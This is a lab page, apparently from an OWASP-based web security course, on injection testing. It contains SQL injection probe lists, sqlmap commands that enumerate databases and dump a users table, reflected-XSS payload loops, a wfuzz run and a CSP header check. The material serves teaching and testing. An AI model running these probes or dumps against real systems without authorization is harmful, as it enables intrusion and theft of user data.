---
title: A03 — Injection (SQLi + XSS)
sidebar_position: 4
tags: [lab, owasp-a03, sql-injection, xss]
---

# A03 — Injection (SQLi + XSS)

## What this lab covers

- Manual SQL injection detection — error-based and logic-based probes
- sqlmap — automated SQLi detection and exploitation
- XSS reflected — canary string method and payload fuzzing
- CSP analysis — checking for policy weaknesses

## Configuration

```bash
TARGET="http://TARGET_IP_OR_DOMAIN"
PORT="80"
WORDLIST="/usr/share/wordlists/dirb/common.txt"
```

## Exercise 1: Manual SQL Injection Probes

Test the search endpoint with injection probes:

```bash
SQLI_PROBES=(
  "'"
  "\""
  "' OR '1'='1"
  "' OR '1'='1'--"
  "' OR 1=1--"
  "\" OR 1=1--"
  "' OR 1=1#"
  "') OR ('1'='1"
  "1 AND 1=1"
  "1 AND 1=2"
  "' UNION SELECT NULL--"
  "' UNION SELECT NULL,NULL--"
)

for PROBE in "${SQLI_PROBES[@]}"; do
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PROBE'))")
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/search?q=$ENCODED")
  echo "Probe '$PROBE': HTTP $RESPONSE"
done
```

Signs of SQLi: HTTP 500 errors, database error messages in response body, different response sizes between `1 AND 1=1` and `1 AND 1=2`.

## Exercise 2: sqlmap

### GET parameter injection

```bash
sqlmap -u "$TARGET/search?q=test" \
  --batch \
  --level=3 \
  --risk=2 \
  --dbs
```

### POST parameter injection

```bash
sqlmap -u "$TARGET/login" \
  --data="username=admin&password=test" \
  --batch \
  --level=3 \
  --risk=2
```

### With session cookie

```bash
sqlmap -u "$TARGET/profile" \
  --cookie="session=abc123" \
  --batch \
  --dbs
```

### Dump a specific table

```bash
sqlmap -u "$TARGET/search?q=test" \
  --batch \
  -D database_name \
  -T users \
  --dump
```

:::warning
`--level` and `--risk` control the aggressiveness of tests. Higher values increase the chance of detection and may cause application errors. Use `--batch` to run non-interactively.
:::

## Exercise 3: XSS Detection (Reflected)

### Canary string method

First inject a unique string to check if it's reflected in the response before trying executable payloads:

```bash
CANARY="xsscanary12345"
RESPONSE=$(curl -s "$TARGET/search?q=$CANARY")
if echo "$RESPONSE" | grep -q "$CANARY"; then
  echo "[REFLECTED] Input is reflected — test XSS payloads"
else
  echo "Input not reflected in response"
fi
```

### XSS payloads

```bash
XSS_PAYLOADS=(
  "<script>alert(1)</script>"
  "<img src=x onerror=alert(1)>"
  "<svg onload=alert(1)>"
  "\"'><script>alert(1)</script>"
  "<ScRiPt>alert(1)</ScRiPt>"
  "<script>alert(String.fromCharCode(88,83,83))</script>"
  "javascript:alert(1)"
  "<iframe src=javascript:alert(1)>"
  "<body onload=alert(1)>"
  "';alert(1)//"
)

for PAYLOAD in "${XSS_PAYLOADS[@]}"; do
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD'''))")
  RESPONSE=$(curl -s "$TARGET/search?q=$ENCODED")
  if echo "$RESPONSE" | grep -qi "onerror\|onload\|<script"; then
    echo "[POTENTIAL XSS] Payload not sanitized: $PAYLOAD"
  fi
done
```

### Fuzzing with wfuzz

```bash
wfuzz -c -z file,/usr/share/wfuzz/wordlist/Injections/XSS.txt \
  --hc 404 \
  "$TARGET/search?q=FUZZ"
```

## Exercise 4: CSP Analysis

Check the Content-Security-Policy header:

```bash
CSP=$(curl -sI "$TARGET" | grep -i "content-security-policy" | cut -d: -f2-)
echo "CSP: $CSP"
```

Weaknesses to look for:

| Issue | Why it matters |
|-------|---------------|
| `unsafe-inline` | Allows inline scripts — negates XSS protection |
| `unsafe-eval` | Allows `eval()` — a common XSS vector |
| `*` (wildcard source) | Allows loading from any domain |
| Missing `default-src` | No fallback policy |
| `http:` as allowed source | Allows mixed content |

Use [Google CSP Evaluator](https://csp-evaluator.withgoogle.com/) to analyze a policy interactively.
